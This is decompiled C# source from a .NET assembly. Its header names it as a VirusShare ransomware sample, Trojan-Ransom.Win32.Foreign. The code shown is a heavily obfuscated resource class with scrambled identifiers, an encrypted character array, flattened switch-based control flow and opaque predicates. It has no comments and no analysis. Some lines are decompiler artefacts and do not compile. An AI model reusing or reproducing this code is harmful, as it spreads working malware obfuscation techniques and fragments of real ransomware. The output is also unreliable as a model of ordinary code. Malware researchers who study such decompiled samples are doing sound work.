// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴜ
// Assembly: KaMaL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8DF9AD97-3392-4345-A8B5-C984422A3CEF
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Ransom.Win32.Foreign.mmxg-c9b06d357201b2aa4433816b3e23da23b6916bb9e01f48ca5190eb9e435f833b.exe

using KaMaL;
using KaMaL.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Policy;
using System.Windows.Forms;

namespace Ⴐ
{
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "2.0.0.0")]
  [HideModuleName]
  [StandardModule]
  internal sealed class Ⴜ
  {
    private static ResourceManager Ⴍ;
    private static CultureInfo Ⴐ;
    private static readonly object ႨႨ;
    private static readonly object ႨႥ = (object) new char[213]
    {
      '酪',
      '酪',
      '酪',
      '螺',
      '\uE18D',
      '얳',
      '\uE7E4',
      '퇘',
      '쐞',
      '퀔',
      '켔',
      '웋',
      'ꮣ',
      'ꮢ',
      'ꮢ',
      'ꮧ',
      '隮',
      '芷',
      '鷸',
      '鐮',
      '댱',
      '尕',
      '尗',
      '尗',
      '尔',
      '由',
      '橨',
      '掮',
      '읊',
      '읉',
      '읉',
      '읙',
      '奔',
      '\uEE49',
      '\uF115',
      '\uF8C5',
      '\uDFD3',
      '\uFBCA',
      '\uD9A7',
      '\uEF9F',
      '梅',
      '\uEE5D',
      '\uF103',
      '\uF8F9',
      '\uDFD7',
      'ﯨ',
      '\uD9A3',
      '\uEF8A',
      '迿',
      '迻',
      '迻',
      '迵',
      '靈',
      '덛',
      '鄓',
      'ꜻ',
      '닉',
      '꛳',
      '릦',
      '끯',
      '靱',
      '덆',
      '鄑',
      '꜖',
      '닶',
      'ꛢ',
      'ꇨ',
      'ꇭ',
      'ꇭ',
      'ꇡ',
      '뼲',
      '褰',
      '鳠',
      '裨',
      '鞦',
      '鹮',
      '륦',
      '鴂',
      '뼬',
      '褣',
      '鳢',
      '裩',
      '뚘',
      '뚞',
      '뚞',
      '뚙',
      'ꡇ',
      '鹔',
      '讎',
      '龌',
      '胉',
      '褑',
      '긏',
      '㾴',
      '㾳',
      '㾳',
      '㾺',
      'ᚑ',
      'ৢ',
      '#',
      '✵',
      '̎',
      '\u2155',
      '\u177B',
      'ʹ',
      'ᚦ',
      '䚇',
      '䚏',
      '䚏',
      '䚃',
      '塃',
      '湏',
      '简',
      '澞',
      '烐',
      '礁',
      '帉',
      '穠',
      '塎',
      '湁',
      '简',
      '澋',
      '쯭',
      '쯤',
      '쯤',
      '쯶',
      '픿',
      '\uE32E',
      '\uF6FE',
      '\uE2F1',
      'ﶘ',
      '\uF46B',
      '퍣',
      '\uF76F',
      '픎',
      '\uE338',
      '\uF6E5',
      '\uE2F7',
      'ﶳ',
      '\uF474',
      '퍯',
      '\uF742',
      '프',
      '\uE325',
      '瞕',
      '瞟',
      '瞟',
      '瞜',
      '潆',
      '䬟',
      '楛',
      'ꓘ',
      'ꓓ',
      'ꓓ',
      'ꓚ',
      '魲',
      '뱎',
      '顳',
      '먩',
      '谈',
      '駳',
      '距',
      '銕',
      '鬂',
      '\u2496',
      '\u249A',
      '\u249A',
      '\u249A',
      '嘆',
      '嘋',
      '嘋',
      '嘂',
      '亵',
      '檦',
      '䣫',
      '绑',
      '欝',
      '罊',
      '恎',
      '槛',
      '争',
      '\uDC08',
      '\uDC06',
      '\uDC06',
      '\uDC1A',
      '\uF530',
      '\uEA51',
      '\uE388',
      '쒿',
      '\uE0A6',
      '싻',
      '\uF4C4',
      '\uE117',
      '\uF538',
      '\uEA6A',
      '\uE383',
      '쒚',
      '\uE0BC',
      '싻',
      '\uF4DA',
      '\uE10D',
      '\uF511',
      '\uEA5D',
      '\uE3A0',
      '쒖',
      '\uE0BB',
      '실',
      '\uF4EA',
      '\uE116',
      '\uF502',
      '\uEA59',
      '\uE392',
      '쒜'
    };
    private static readonly object ႨႣ;
    internal static Ⴐ.Ⴜ.ႨႠ ႨႳ;

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager Ⴄ
    {
      get
      {
label_3:
        bool flag = Ⴐ.Ⴈ.ႳႳ((object) Ⴐ.Ⴜ.Ⴍ, (object) null, 716, 647);
label_4:
        int num = !flag ? 4 : 3;
        object obj;
        while (true)
        {
          switch (num)
          {
            case 0:
              goto label_8;
            case 1:
              goto label_4;
            case 2:
              Ⴐ.Ⴜ.Ⴍ = obj as ResourceManager;
              num = 4;
              continue;
            case 3:
              obj = (object) new ResourceManager("Ⴐ.Ⴜ", ႰႭ.ႰႼ(typeof (Ⴐ.Ⴜ), 500, 426));
              goto case 2;
            case 4:
              goto label_7;
            case 6:
              goto label_3;
            default:
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႷႣ);
              num = 6;
              continue;
          }
        }
label_7:
        object ⴍ = (object) Ⴐ.Ⴜ.Ⴍ;
label_8:
        ResourceManager resourceManager = ⴍ as ResourceManager;
        MyComputer.Ⴅ();
        return resourceManager;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Ⴐ
    {
      get
      {
        CultureInfo ⴐ = (IFormatProvider) Ⴐ.Ⴜ.Ⴐ as CultureInfo;
        MyComputer.Ⴅ();
        jDxmSbcafQKRuIHXbd.Ⴗ[108] = (byte) ((int) jDxmSbcafQKRuIHXbd.Ⴗ[108] & (int) jDxmSbcafQKRuIHXbd.Ⴗ[148] & 124);
        return ⴐ;
      }
      [param: In] set
      {
        Ⴐ.Ⴜ.Ⴐ = value;
        MyComputer.Ⴄ();
      }
    }

    static Ⴜ()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        '⢯'
      };
      chArray[3] = '㿠';
      chArray[0] = '㵢';
      chArray[5] = '㳏';
      chArray[2] = '㘾';
      chArray[4] = '\u18FF';
      chArray[1] = '⥡';
      chArray[6] = 'ẏ';
      Ⴐ.Ⴜ.ႨႣ = (object) new string[15];
      Ⴐ.Ⴜ.ႨႨ = (object) chArray;
      ႰႭ.Ⴜ();
    }

    internal static string Ⴅ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 1249;
      int num2 = num1;
      int num3 = (num2 * num2 + num1) % 2 == 0 ? (int) ⴀ[53] - 92 : 6;
      while (true)
      {
        switch (num3)
        {
          case 1:
          case 4:
            Ⴐ.Ⴜ.Ⴅ();
            num3 = (int) ⴀ[36];
            continue;
          case 2:
            goto label_3;
          case 3:
          case 7:
            goto label_6;
          case 6:
            num3 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴅ);
            num3 = (int) ⴗ[35];
            continue;
        }
      }
label_6:
      jDxmSbcafQKRuIHXbd.Ⴗ[58] = (byte) ((int) jDxmSbcafQKRuIHXbd.Ⴗ[58] * (int) jDxmSbcafQKRuIHXbd.Ⴗ[254] & 206);
      return (string) null;
    }

    internal static string Ⴄ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      ႰႭ.ႰႳ('̡', 829).SetData(ႰႭ.ႰႣ(10L, 7, 1779788318), (object) null);
      int num = (int) ⴗ[35];
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
          case 5:
            goto label_3;
          case 1:
          case 2:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴄ);
            num = (int) ⴀ[100] - (int) ⴀ[19];
            continue;
        }
      }
label_4:
      jDxmSbcafQKRuIHXbd.Ⴗ[208] = (byte) ((int) jDxmSbcafQKRuIHXbd.Ⴗ[208] & (int) jDxmSbcafQKRuIHXbd.Ⴗ[102] & 85);
      return (string) null;
    }

    internal static string Ⴓ()
    {
label_3:
      ႰႭ.ႰႠ(357, (short) 275).SetData(ႰႭ.ႰႣ(4L, 1, 1779788312), (object) null);
      int num = 4;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
          case 2:
            goto label_3;
          case 3:
          case 4:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴓ);
            num = 2;
            continue;
        }
      }
label_4:
      return (string) null;
    }

    internal static byte Ⴍ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      ႰႭ.ႰႠ(38, (short) 81).SetData(ႰႭ.ႰႣ(2L, 7, 1779788318), (object) null);
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 3:
          case 4:
          case 5:
            goto label_3;
          case 2:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴍ);
            num = (int) ⴗ[8];
            continue;
        }
      }
label_4:
      return 5;
    }

    internal static byte Ⴈ()
    {
label_3:
      ႰႭ.ႰႠ(757, (short) 653).SetData(ႰႭ.ႰႣ(9L, 5, 1779788316), (object) null);
      int num = 4;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_3;
          case 1:
          case 2:
          case 3:
          case 4:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴈ);
            num = 0;
            continue;
        }
      }
label_4:
      jDxmSbcafQKRuIHXbd.Ⴗ[84] = (byte) ((int) jDxmSbcafQKRuIHXbd.Ⴗ[84] & (int) MyApplication.Ⴀ[36] & 250);
      return 7;
    }

    internal static System.Type Ⴐ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num = 1432 > 179 - 105 * 8 ? (int) ⴗ[35] : 4;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            Ⴐ.Ⴜ.Ⴐ();
            num = 7;
            continue;
          case 1:
          case 5:
          case 7:
            goto label_6;
          case 3:
            goto label_3;
          case 4:
            num = (int) ⴀ[36];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴐ);
            num = 3;
            continue;
        }
      }
label_6:
      return typeof (jDxmSbcafQKRuIHXbd.BnOkjMsLwBaBMGYVrOmeamDSnbkIDgiP);
    }

    internal static string Ⴀ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) MyComputer.Ⴜ(ႰႭ.ႰႠ(340, (short) 301), ႰႭ.ႰႣ(6L, 7, 1779788318), (short) 47, (short) 51);
      int num1 = (int) ⴀ[119];
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_23;
          case 1:
          case 10:
            num1 = (byte) 207 == ((byte[]) obj)[index] ? (int) ⴀ[164] - 19 : (int) ⴗ[236];
            continue;
          case 2:
            Ⴐ.Ⴈ.Ⴀ();
            num1 = (int) ⴀ[185] + 1;
            continue;
          case 3:
            goto label_19;
          case 5:
          case 24:
            ++index;
            num1 = (int) ⴗ[235] + 9;
            continue;
          case 6:
            num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴗ[172] - (int) ⴗ[64] : 20;
            continue;
          case 7:
            num1 = ((byte[]) obj)[index] < (byte) 14 ? 3 : (int) ⴀ[38] - 211;
            continue;
          case 8:
            num1 = (obj as byte[])[index] < (byte) 4 ? 15 : 14;
            continue;
          case 9:
            num1 = (obj as byte[])[index] < (byte) 8 ? (int) ⴀ[81] - 6 : 6;
            continue;
          case 11:
            ++index;
            num1 = (int) ⴗ[18] - 85;
            continue;
          case 12:
            goto label_9;
          case 13:
            goto label_3;
          case 14:
            num1 = (byte) 4 == (obj as byte[])[index] ? (int) ⴗ[160] - (int) ⴗ[25] : 23;
            continue;
          case 15:
            goto label_14;
          case 17:
            ++index;
            num1 = 8;
            continue;
          case 18:
            num1 = (obj as byte[])[index] < (byte) 207 ? 12 : (int) ⴗ[232] - 166;
            continue;
          case 19:
            num1 = (byte) 14 == (obj as byte[])[index] ? (int) ⴗ[150] - (int) ⴗ[181] : (int) ⴗ[35];
            continue;
          case 20:
            Ⴐ.Ⴈ.Ⴃ();
            num1 = (int) ⴗ[247] - 106;
            continue;
          case 21:
            Ⴐ.Ⴈ.Ⴀ();
            num1 = 17;
            continue;
          case 22:
            goto label_4;
          case 23:
            Ⴐ.Ⴜ.Ⴅ();
            num1 = 11;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴀ);
            num1 = 13;
            continue;
        }
      }
label_4:
      return (string) null;
label_9:
      return (string) null;
label_14:
      return (string) null;
label_19:
      return (string) null;
label_23:
      int num2 = index + 1;
      return (string) null;
    }

    internal static int Ⴃ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int index = 0;
      Array array = (Array) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႳ('Ϳ', 866), ႰႭ.ႰႣ(4L, 4, 1779788317), (short) 973, 979);
      int num1 = 7;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 23:
            goto label_24;
          case 1:
            Ⴐ.Ⴈ.ႨႭ.Ⴐ();
            num1 = 14;
            continue;
          case 2:
            num1 = (byte) 207 == ((byte[]) array)[index] ? 24 : (int) ⴀ[13] - 26;
            continue;
          case 3:
          case 25:
            num1 = (array as byte[])[index] < (byte) 207 ? 18 : 2;
            continue;
          case 4:
            goto label_28;
          case 5:
            Ⴐ.Ⴈ.Ⴄ();
            num1 = (int) ⴀ[68] - 145;
            continue;
          case 6:
            ++index;
            num1 = 16;
            continue;
          case 7:
          case 17:
            num1 = (array as byte[])[index] < (byte) 8 ? (int) ⴀ[120] + 4 : (int) ⴗ[235];
            continue;
          case 8:
            Ⴐ.Ⴈ.Ⴄ();
            num1 = (int) ⴀ[126] - 237;
            continue;
          case 9:
            num1 = (byte) 8 == (array as byte[])[index] ? 14 : (int) ⴀ[119] - 8;
            continue;
          case 10:
            num1 = (array as byte[])[index] < (byte) 4 ? 15 : 27;
            continue;
          case 11:
            goto label_19;
          case 12:
            Ⴐ.Ⴈ.ႨႭ.Ⴐ();
            num1 = (int) ⴀ[35] - 37;
            continue;
          case 13:
            num1 = (byte) 14 == ((byte[]) array)[index] ? 6 : 12;
            continue;
          case 14:
            ++index;
            num1 = 25;
            continue;
          case 15:
            goto label_14;
          case 16:
            int num2 = (int) ((byte[]) array)[index];
            MyApplication.Ⴀ[92] = (byte) ((int) MyApplication.Ⴀ[92] + (int) MyApplication.Ⴀ[10] & 103);
            num1 = num2 < 157 ? 23 : (int) ⴗ[119] - 21;
            continue;
          case 18:
            goto label_9;
          case 19:
            Ⴐ.Ⴈ.Ⴃ();
            num1 = 26;
            continue;
          case 20:
            num1 = (byte) 157 == ((byte[]) array)[index] ? (int) ⴀ[187] - 70 : 8;
            continue;
          case 22:
            goto label_3;
          case 24:
            ++index;
            num1 = 10;
            continue;
          case 26:
            ++index;
            num1 = 28;
            continue;
          case 27:
            num1 = (byte) 4 == ((byte[]) array)[index] ? (int) ⴗ[253] - 169 : 19;
            continue;
          case 28:
            num1 = ((byte[]) array)[index] < (byte) 14 ? 11 : 13;
            continue;
          case 29:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴃ);
            num1 = 22;
            continue;
        }
      }
label_4:
      return 2;
label_9:
      return 10;
label_14:
      return 1;
label_19:
      return 11;
label_24:
      return 0;
label_28:
      int num3 = index + 1;
      return 9;
    }

    internal static void Ⴗ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
      int index;
      object obj;
      switch (1)
      {
        case 0:
label_7:
          while ((obj as byte[])[index] >= (byte) 8)
          {
            int num1 = 14;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  ႰႭ.Ⴃ();
                  num1 = 19;
                  continue;
                case 1:
                  goto label_12;
                case 2:
                case 8:
                  ++index;
                  num1 = (int) ⴗ[173] - 3;
                  continue;
                case 3:
                case 15:
                  num1 = (obj as byte[])[index] < (byte) 207 ? (int) ⴗ[143] - (int) ⴗ[206] : 4;
                  continue;
                case 4:
                  num1 = (byte) 207 == ((byte[]) obj)[index] ? (int) ⴗ[8] * 8 : (int) ⴀ[20] - 68;
                  continue;
                case 5:
                  goto label_4;
                case 6:
                  goto label_17;
                case 7:
                  num1 = ((byte[]) obj)[index] < (byte) 4 ? (int) ⴗ[8] : (int) ⴀ[113] - 87;
                  continue;
                case 9:
                  goto label_7;
                case 12:
                  num1 = (obj as byte[])[index] < (byte) 14 ? 6 : 13;
                  continue;
                case 13:
                  num1 = (byte) 14 == (obj as byte[])[index] ? 19 : (int) ⴗ[184] - (int) ⴗ[167];
                  continue;
                case 14:
                  num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴀ[96] - 196 : (int) ⴗ[204];
                  continue;
                case 16:
                  Ⴐ.Ⴈ.Ⴀ();
                  num1 = (int) ⴀ[103] - 74;
                  continue;
                case 17:
                  ++index;
                  num1 = (int) ⴀ[132] - 20;
                  continue;
                case 18:
                  MyComputer.Ⴐ();
                  num1 = 8;
                  continue;
                case 19:
                  goto label_25;
                case 20:
                  ႰႭ.Ⴈ();
                  num1 = (int) ⴀ[165] - 15;
                  continue;
                case 21:
                  ++index;
                  num1 = 12;
                  continue;
                case 22:
                  num1 = (byte) 4 == (obj as byte[])[index] ? (int) ⴗ[236] : 20;
                  continue;
                default:
                  goto label_6;
              }
            }
label_12:
            break;
label_4:
            break;
label_17:
            break;
label_6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴗ);
            break;
label_25:
            int num2 = index + 1;
            break;
          }
          break;
        case 2:
          break;
        case 3:
          obj = (object) (byte[]) MyComputer.Ⴜ(ႰႭ.ႰႳ('̦', 824), ႰႭ.ႰႣ(7L, 5, 1779788316), (short) 120, (short) 101);
          goto case 0;
        default:
          index = 0;
          goto case 3;
      }
    }

    internal static int Ⴜ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int index = 0;
label_4:
      object obj = (object) (byte[]) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႳ('Ƒ', 398), ႰႭ.ႰႣ(6L, 2, 1779788315), (short) 411, 388);
      int num1 = (int) ⴀ[120] - 21;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            num1 = (obj as byte[])[index] < (byte) 8 ? 5 : (int) ⴗ[204] / 2;
            continue;
          case 1:
            goto label_4;
          case 2:
          case 8:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 7 : (int) ⴀ[53] - 93;
            continue;
          case 3:
            Ⴐ.Ⴜ.Ⴄ();
            num1 = 7;
            continue;
          case 5:
            goto label_5;
          case 7:
            goto label_9;
          case 9:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.Ⴜ);
            num1 = 9;
            continue;
        }
      }
label_5:
      return 8;
label_9:
      int num2 = index + 1;
      return 6;
    }

    internal static void ႤႥ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
      int index;
      Array array;
      switch (3)
      {
        case 0:
label_6:
          while ((array as byte[])[index] >= (byte) 8)
          {
            int num1 = 20;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 25:
                  num1 = (array as byte[])[index] < (byte) 14 ? (int) ⴀ[35] - 37 : (int) ⴀ[166] - 4;
                  continue;
                case 1:
                  num1 = 16;
                  continue;
                case 2:
                  num1 = (array as byte[])[index] < (byte) 4 ? 21 : 17;
                  continue;
                case 3:
                  ++index;
                  num1 = 2;
                  continue;
                case 4:
                  num1 = (byte) 207 == (array as byte[])[index] ? 3 : 10;
                  continue;
                case 5:
                  Ⴐ.Ⴈ.ႨႭ.Ⴐ();
                  num1 = (int) ⴗ[259] - (int) ⴗ[18];
                  continue;
                case 6:
                  goto label_16;
                case 7:
                  goto label_21;
                case 8:
                  goto label_3;
                case 9:
                  int num2 = (int) (array as byte[])[index];
                  jDxmSbcafQKRuIHXbd.Ⴗ[80] = (byte) (((int) jDxmSbcafQKRuIHXbd.Ⴗ[80] ^ (int) jDxmSbcafQKRuIHXbd.Ⴗ[256]) & 53);
                  num1 = num2 < 207 ? (int) ⴀ[129] - 220 : 4;
                  continue;
                case 10:
                  Ⴐ.Ⴈ.ႨႭ.Ⴐ();
                  num1 = 3;
                  continue;
                case 11:
                  ++index;
                  num1 = (int) ⴗ[90] - 171;
                  continue;
                case 12:
                  goto label_31;
                case 13:
                  num1 = (byte) 14 == ((byte[]) array)[index] ? 27 : 22;
                  continue;
                case 14:
                  ++index;
                  num1 = (int) ⴀ[174] - 115;
                  continue;
                case 15:
                  ႰႭ.Ⴃ();
                  num1 = 14;
                  continue;
                case 16:
                  num1 = (array as byte[])[index] < (byte) 157 ? 7 : 23;
                  continue;
                case 17:
                  num1 = (byte) 4 == (array as byte[])[index] ? (int) ⴀ[97] - 33 : 5;
                  continue;
                case 18:
                  goto label_6;
                case 19:
                  goto label_27;
                case 20:
                  num1 = (byte) 8 == (array as byte[])[index] ? (int) ⴗ[164] / 9 : 15;
                  continue;
                case 21:
                  goto label_11;
                case 22:
                  ႰႭ.Ⴀ();
                  num1 = 27;
                  continue;
                case 23:
                  num1 = (byte) 157 == (array as byte[])[index] ? (int) ⴀ[7] - (int) ⴀ[26] : 26;
                  continue;
                case 26:
                  ႰႭ.Ⴀ();
                  num1 = 12;
                  continue;
                case 27:
                  ++index;
                  goto case 1;
                default:
                  goto label_5;
              }
            }
label_16:
            break;
label_21:
            break;
label_3:
            break;
label_27:
            break;
label_11:
            break;
label_5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႤႥ);
            break;
label_31:
            int num3 = index + 1;
            break;
          }
          break;
        case 1:
          break;
        case 4:
          break;
        default:
          index = 0;
          array = (Array) MyComputer.Ⴜ(ႰႭ.ႰႠ(242, (short) 136), ႰႭ.ႰႣ(3L, 8, 1779788305), (short) 92, (short) 66);
          goto case 0;
      }
    }

    internal static object ႤႤ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႠ(420, (short) 479), ႰႭ.ႰႣ(3L, 5, 1779788316), (short) 709, 741);
      int num1 = 31;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_19;
          case 1:
            num1 = (obj as byte[])[index] < (byte) 4 ? 11 : (int) ⴀ[18] - 141;
            continue;
          case 2:
            goto label_24;
          case 3:
            goto label_3;
          case 4:
            Ⴐ.Ⴈ.ႨႭ.Ⴓ();
            num1 = 5;
            continue;
          case 5:
            ++index;
            num1 = (int) ⴗ[8];
            continue;
          case 6:
            num1 = (byte) 4 == ((byte[]) obj)[index] ? 8 : 25;
            continue;
          case 7:
            num1 = ((byte[]) obj)[index] < (byte) 157 ? 2 : (int) ⴗ[141];
            continue;
          case 8:
          case 20:
            ++index;
            num1 = 14;
            continue;
          case 9:
          case 29:
            goto label_4;
          case 10:
            num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴗ[40] - 191 : (int) ⴗ[25];
            continue;
          case 11:
            goto label_14;
          case 12:
            num1 = (byte) 207 == ((byte[]) obj)[index] ? 5 : 4;
            continue;
          case 13:
            num1 = (byte) 198 == (obj as byte[])[index] ? (int) ⴗ[26] - 86 : 30;
            continue;
          case 14:
            num1 = (obj as byte[])[index] < (byte) 14 ? 0 : (int) ⴗ[216] - 223;
            continue;
          case 15:
            ++index;
            num1 = (int) ⴀ[129] / 6;
            continue;
          case 16:
            Ⴐ.Ⴈ.Ⴄ();
            num1 = (int) ⴗ[245];
            continue;
          case 17:
            num1 = (byte) 14 == (obj as byte[])[index] ? 19 : 16;
            continue;
          case 18:
            num1 = (byte) 0 == (obj as byte[])[index] ? 21 : 26;
            continue;
          case 19:
            ++index;
            num1 = (int) ⴗ[241] - 21;
            continue;
          case 21:
            ++index;
            num1 = (int) ⴀ[132];
            continue;
          case 22:
            goto label_29;
          case 23:
            Ⴐ.Ⴈ.ႨႭ.Ⴓ();
            num1 = 27;
            continue;
          case 24:
            goto label_38;
          case 25:
            ႰႭ.Ⴃ();
            num1 = 8;
            continue;
          case 26:
            Ⴐ.Ⴜ.Ⴄ();
            num1 = 21;
            continue;
          case 27:
            ++index;
            num1 = (int) ⴀ[90] - (int) ⴀ[123];
            continue;
          case 28:
            goto label_9;
          case 30:
            Ⴐ.Ⴜ.Ⴓ();
            num1 = 24;
            continue;
          case 31:
            num1 = (obj as byte[])[index] < (byte) 8 ? (int) ⴀ[119] : 10;
            continue;
          case 32:
            goto label_34;
          case 33:
            num1 = ((byte[]) obj)[index] < (byte) 207 ? 28 : 12;
            continue;
          case 34:
            num1 = (byte) 157 == (obj as byte[])[index] ? 15 : (int) ⴗ[239];
            continue;
          case 35:
            num1 = ((byte[]) obj)[index] < (byte) 198 ? 32 : 13;
            continue;
          case 36:
            MyComputer.Ⴀ();
            num1 = (int) ⴀ[53] - 81;
            continue;
          case 37:
          case 38:
            num1 = (obj as byte[])[index] < (byte) 0 ? 22 : 18;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴜ.ႤႤ);
            num1 = 3;
            continue;
        }
      }
label_4:
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_19:
      return (object) null;
label_24:
      return (object) null;
label_29:
      return (object) null;
label_34:
      return (object) null;
label_38:
      int num2 = index + 1;
      return (object) null;
    }

    internal static string ႤႳ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int index = 0;
      Array array = (Array) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႠ(414, (short) 482), ႰႭ.ႰႣ(9L, 7, 1779788318), (short) 59, 26);
      int num1 = (int) ⴗ[244] - 39;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            int num2 = (int) Ⴐ.Ⴜ.Ⴍ();
            num1 = (int) ⴗ[179] - 111;
            continue;
          case 1:
            ႰႭ.Ⴀ();
            num1 = 35;
            continue;
          case 3:
            num1 = (array as byte[])[index] < (byte) 157 ? 14 : 18;
            continue;
          case 4:
            num1 = ((byte[]) array)[index] < (byte) 0 ? (int) ⴗ[236] : (int) ⴀ[86] - 95;
            continue;
          case 5:
          case 22:
            ++index;
            num1 = (int) ⴗ[155] - 50;
            continue;
          case 6:
            num1 = (byte) 4 == ((byte[]) array)[index] ? 23 : 30;
            continue;
          case 7:
            ++index;
            num1 = (int) ⴗ[235];
            continue;
          case 8:
            ++index;
            num1 = (int) ⴀ[70] - 158;
            continue;
          case 9:
            num1 = ((byte[]) array)[index] < (byte) 207 ? 17 : 38;
            continue;
          case 10:
            num1 = ((byte[]) array)[index] < (byte) 198 ? (int) ⴀ[30] - 58 : 34;
            continue;
          case 11:
            num1 = ((byte[]) array)[index] < (byte) 8 ? (int) ⴗ[247] - 98 : 25;
            continue;
          case 12:
          case 15:
            Ⴐ.Ⴈ.ႨႭ.Ⴓ();
            num1 = (int) ⴗ[130] - 108;
            continue;
          case 13:
            goto label_4;
          case 14:
            goto label_24;
          case 16:
            goto label_19;
          case 17:
            goto label_9;
          case 18:
            num1 = (byte) 157 == (array as byte[])[index] ? (int) ⴗ[205] - (int) ⴗ[201] : 33;
            continue;
          case 19:
            goto label_14;
          case 20:
            goto label_38;
          case 21:
            goto label_29;
          case 23:
            ++index;
            num1 = (int) ⴀ[51] - 102;
            continue;
          case 25:
            num1 = (byte) 8 == ((byte[]) array)[index] ? 7 : 12;
            continue;
          case 26:
            num1 = (byte) 0 == ((byte[]) array)[index] ? 39 : (int) ⴀ[81];
            continue;
          case 27:
            goto label_34;
          case 28:
            ႰႭ.Ⴀ();
            num1 = (int) ⴀ[39] - 2;
            continue;
          case 29:
            num1 = ((byte[]) array)[index] < (byte) 4 ? 19 : 6;
            continue;
          case 30:
            Ⴐ.Ⴜ.Ⴅ();
            num1 = (int) ⴀ[17] - 32;
            continue;
          case 31:
            goto label_3;
          case 32:
            Ⴐ.Ⴜ.Ⴅ();
            num1 = 8;
            continue;
          case 33:
            Ⴐ.Ⴈ.ႨႭ.Ⴐ();
            num1 = 5;
            continue;
          case 34:
            num1 = (byte) 198 == (array as byte[])[index] ? (int) ⴗ[282] - 102 : 2;
            continue;
          case 35:
            ++index;
            num1 = (int) ⴀ[106] - 31;
            continue;
